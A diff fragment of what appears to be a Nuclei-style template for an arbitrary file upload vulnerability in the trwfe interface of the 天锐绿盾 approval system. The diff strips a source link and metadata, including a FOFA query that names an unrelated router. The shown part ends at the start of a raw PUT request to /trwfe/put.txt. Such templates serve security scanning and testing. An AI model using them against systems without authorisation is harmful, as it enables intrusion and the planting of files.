@@ -3,12 +3,8 @@ info:
   name: 天锐绿盾审批系统trwfe接口任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nv7zl9mumngptu0g'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nv7zl9mumngptu0g
-    fofa: title = ZSRV2路由器Web管理系统
 http:
 - raw:
   - 'PUT /trwfe/put.txt HTTP/1.1
